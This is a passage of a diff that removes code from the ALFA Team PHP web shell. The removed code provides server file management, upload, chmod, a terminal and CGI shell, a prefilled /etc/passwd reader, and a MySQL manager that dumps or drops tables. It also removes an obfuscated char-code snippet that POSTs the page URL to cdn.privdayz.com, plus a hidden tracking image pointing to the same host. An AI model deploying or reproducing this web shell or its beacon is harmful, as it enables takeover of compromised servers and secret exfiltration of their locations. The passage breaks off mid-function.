-$resp = $curl->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$hash}&crypt=Search");
-echo(__pre().'<center>');
-if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$resp,$s)){
-	echo('<font color="green">'.$s[1].'</font>');
-}else{
-	echo('<font color="red">Not Found...!</font>');
-}
-echo('</center><br>');
-}
-}
-}
-echo '</div>';
-alfafooter();
-}
-function alfafooter(){
-if(!isset($_POST['ajax'])){
-echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
-<tr>
-<td width='17%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'mkfile','','','','file');this.f.value='';return false;\"><span class='footer_text'>Make File : </span><br><input class='dir' type='text' name='f' value=''> <input type='submit' value=' '></form></td>
-<td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);this.d.value='';return false;\"><span class='footer_text'>Make Dir : </span><br><input class='dir' type='text' name='d' value=' '> <input type='submit' value=' '></form></td>
-<td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);this.del.value='';return false;\"><span class='footer_text'>Delete : </span><br><input class='dir' type='text' name='del' value=' '> <input type='submit' value=' '></form></td>
-<td width='19%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'chmod','','','','none');this.f.value='';return false;\"><span class='footer_text'>Chmod : </span><br><input class='dir' type=text name=f value=' '> <input type='submit' value=' '></form></td>
-</tr>
-<tr>
-<td colspan='2'><form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='".htmlspecialchars($GLOBALS['cwd'])."'> <input type='submit' value=' '></form></td>
-<td colspan='2'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
-</tr>
-<tr>
-<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
-</tr>
-<tr>
-<td colspan='4'><form onsubmit='u(this);return false;' name='footer_form' method='post' ENCTYPE='multipart/form-data'>
-<input type='hidden' name='a' value='FilesMAn'>
-<input type='hidden' name='c' value='" . $GLOBALS['cwd'] ."'>
-<input type='hidden' name='ajax' value='true'>
-<input type='hidden' name='alfa1' value='uploadFile'>
-<input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./AlfaTeam &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>solevisible[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@solevisible</a></span><center><img src='https://cdn.privdayz.com/images/logo.jpg' height='0' width='0' referrerpolicy='unsafe-url' /></center></div></td>
-</tr>
-</table>
-</div>
-
-<div id='options_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"options_window\");'></div><div onClick='editorClose(\"options_window\");' class='close-button'></div></div></div><div style='height:100%;' class='content_options_holder'><div class='options_tab'></div><div class='options_content' style='margin-left:14px;margin-right:30px;background:#000;overflow:auto;'></div></div></div></div>
-
-<div id='database_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'>Sql Manager</div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"database_window\");'></div><div onClick='editorClose(\"database_window\");' class='close-button'></div></div></div><div class='content_options_holder' style='margin-left:14px;margin-right:30px;background:#000;max-height:90%;'><div class='sql-tabs'></div><div class='sql-contents' style='max-height: 85vh;'></div></div></div></div>
-
-<div id='cgiloader'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"cgiloader\");'></div><div onClick='editorClose(\"cgiloader\");' class='close-button'></div></div></div><div id='cgiframe' style='position:relative;margin-left:14px;margin-right:30px;'><div class='terminal-tabs'></div><div style='height:90%;' class='terminal-contents'></div></div></div></div>
-<div id='editor' style='display:none;'><div class='editor-wrapper'><div class='editor-header'><div class='editor-path'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"editor\");'></div><div onClick='editorClose(\"editor\");' class='close-button'></div></div></div><div onclick='historyPanelController(this);' mode='visible' class='history-panel-controller'><<</div><div class='editor-explorer'><div class='hheader'><div class='history-clear' onclick='clearEditorHistory();'>Clear all</div><div class='hheader-text'>History</div><div class='editor-search'><input type='text' style='text-align:center;' id='search-input' placeholder='search'></div></div><div class='history-list'></div></div><div class='editor-modal'><div class='editor-body'><div class='editor-content'><div class='editor-tabs'></div><div class='editor-content-holder'></div></div></div></div></div></div>
-<div id='update-content'></div>
-<div id='database_window-minimized' onclick='showEditor(\"database_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div class='minimized-text' style='top: 15px;'>Database</div></div></div>
-<div id='options_window-minimized' onclick='showEditor(\"options_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 4px;' class='minimized-text'>Options</div></div></div>
-<div id='editor-minimized' onclick='showEditor(\"editor\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 2px;' class='minimized-text'>Editor</div></div></div>
-<div id='cgiloader-minimized' onclick='showEditor(\"cgiloader\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 12px;' class='minimized-text'>Cgi Shell</div></div></div>
-<div id='rightclick_menu'>
-  <a target='_blank' href='' name='newtab'><img src=\"http://solevisible.com/icons/menu/newtab.svg\"> Open in new tab</a>
-  <a target='_blank' href='' name='link'><img src=\"http://solevisible.com/icons/menu/link.svg\"> Open file directly</a>
-  <a href='javascript:void(0);' name='download'><img src=\"http://solevisible.com/icons/menu/download2.svg\"> Download</a>
-  <a href='' name='view'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View</a>
-  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View Archive</a>
-  <a href='' name='edit'><img src=\"http://solevisible.com/icons/menu/edit.svg\"> Edit</a>
-  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
-  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
-  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.com/icons/menu/rename.svg\">  Rename</a>
-  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.com/icons/menu/time.svg\">  Modify</a>
-  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
-  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.com/icons/menu/resize.svg\"> Compress</a>
-  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.com/icons/menu/increase.svg\"> Extract</a>
-  <a href='javascript:void(0);' name='delete'><img src=\"http://solevisible.com/icons/menu/delete.svg\"> Delete</a>
-</div>
-<div id=\"filesman-tab-full-path\"></div>
-<div id='alert-area' class='alert-area'></div>
-<div class='cl-popup-fixed' style='display:none;'>
-	<div id='shortcutMenu-holder'>
-		<div class='popup-head'></div>
-			<form autocomplete='off' onSubmit='return false;'>
-				<label class='old-path-lbl'></label>
-				<div style='overflow: hidden;white-space: nowrap;text-overflow: ellipsis;' class='old-path-content'></div>
-				<label style='margin-top:10px;' class='new-filename-lbl'>New file name</label>
-				<input type='text' name='fname'>
-				<div class='perm-table-holder'>
-					<table>
-					   <tbody>
-					      <tr>
-					         <td><b>Mode</b></td>
-					         <td>User</td>
-					         <td>Group</td>
-					         <td>World</td>
-					      </tr>
-					      <tr>
-					         <td>Read</td>
-					         <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
-					      </tr>
-					      <tr>
-					         <td>Write</td>
-					         <td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='gw' value='2' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='ww' value='2' onclick='calcperm();'></td>
-					      </tr>
-					      <tr>
-					         <td>Execute</td>
-					         <td><input type='checkbox' name='ux' value='1' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
-					      </tr>
-					      <tr>
-					         <td>Permission</td>
-					         <td><input style='width:60px;' type='text' name='u' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"u\", [\"u\"]);'></td>
-					         <td><input style='width:60px;' type='text' name='g' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"g\", [\"g\"]);'></td>
-					         <td><input style='width:60px;' type='text' name='w' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"w\", [\"w\"]);'></td>
-					      </tr>
-					   </tbody>
-					</table>
-				</div>
-
-			</form>
-		<div class='popup-foot'>
-			<button style='background: #2b5225;' name='accept' action='' onclick='alfaPopUpDoAction(this);'></button>
-			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
-		</div>
-	</div>
-</div>";?>
-<script>
-function alfaMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:alfab64("Sql_manager_api"),c_:alfab64(c_),alfa1:alfab64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("alfa2")&&"load_data"!=e.post.alfa2&&"page"!=e.post.alfa2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=alfab64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";alfaloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){alfaloader(e.db_id,"none"),t(a)},!0,e.db_id)}function alfaMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function alfaMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;alfaMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{alfa2:"load_all_tables",alfa3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);alfaMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/b_minus.png")}})}else if(void 0===t)for(var n in alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)alfaMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)alfaMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/"+s}}function alfaMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="http://solevisible.com/icons/menu/"+l}function alfaMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?alfaMysqlTableMode(a,t):alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{alfa2:"load_tables",alfa3:i}},function(e){0!=e.length&&alfaMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}(()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})();function alfaMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function alfaMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function alfaMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{alfa2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?alfaMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function alfaMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"alfaLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="http://solevisible.com/icons/menu/b_minus.png"}function alfaMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{alfa2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function alfaMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function alfaMysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function alfaMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function alfaLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{alfa2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=alfaMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='alfaMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='alfaMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='alfaMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",alfaMysqlReportBuilder(i,e)}})}function alfaMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{alfa2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function alfaMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{alfa2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function alfaMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{alfa2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,alfaMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function alfaMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function alfaMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;alfaMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{alfa2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function alfaMysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,alfaMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{alfa2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function alfaMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and 